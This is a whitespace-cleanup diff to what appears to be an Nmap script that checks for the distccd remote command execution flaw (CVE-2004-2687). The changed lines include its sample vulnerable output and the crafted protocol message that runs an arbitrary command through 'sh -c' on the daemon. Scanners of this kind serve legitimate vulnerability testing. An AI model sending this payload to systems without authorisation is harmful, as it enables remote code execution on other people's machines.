@@ -16,7 +16,7 @@ present in modern implementation due to poor configuration of the service.
 -- @output
 -- PORT     STATE SERVICE
 -- 3632/tcp open  distccd
--- | distcc-test: 
+-- | distcc-test:
 -- |   VULNERABLE:
 -- |   distcc Daemon Command Execution
 -- |     State: VULNERABLE (Exploitable)
@@ -25,12 +25,12 @@ present in modern implementation due to poor configuration of the service.
 -- |     Description:
 -- |       Allows executing of arbitrary commands on systems running distccd 3.1 and
 -- |       earlier. The vulnerability is the consequence of weak service configuration.
--- |       
+-- |
 -- |     Disclosure date: 2002-02-01
 -- |     Extra information:
--- |       
+-- |
 -- |     uid=118(distccd) gid=65534(nogroup) groups=65534(nogroup)
--- |   
+-- |
 -- |     References:
 -- |       http://distcc.googlecode.com/svn/trunk/doc/web/security.html
 -- |       http://http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2004-2687
@@ -80,21 +80,21 @@ earlier. The vulnerability is the consequence of weak service configuration.
 	if ( not(socket:connect(host, port)) ) then
 		return fail("Failed to connect to distcc server")
 	end
-	
+
 	local cmds = {
 		"DIST00000001",
-		("ARGC00000008ARGV00000002shARGV00000002-cARGV%08.8xsh -c " .. 
+		("ARGC00000008ARGV00000002shARGV00000002-cARGV%08.8xsh -c " ..
 		 "'(%s)'ARGV00000001#ARGV00000002-cARGV00000006main.cARGV00000002" ..
 		 "-oARGV00000006main.o"):format(10 + #arg_cmd, arg_cmd),
 		"DOTI00000001A\n",
 	}
-	
+
 	for _, cmd in ipairs(cmds) do
 		if ( not(socket:send(cmd)) ) then
 			return fail("Failed to send data to distcc server")
 		end
 	end
-	
+
 	local status, data = socket:receive_buf("DOTO00000000", false)
 
 	if ( status ) then
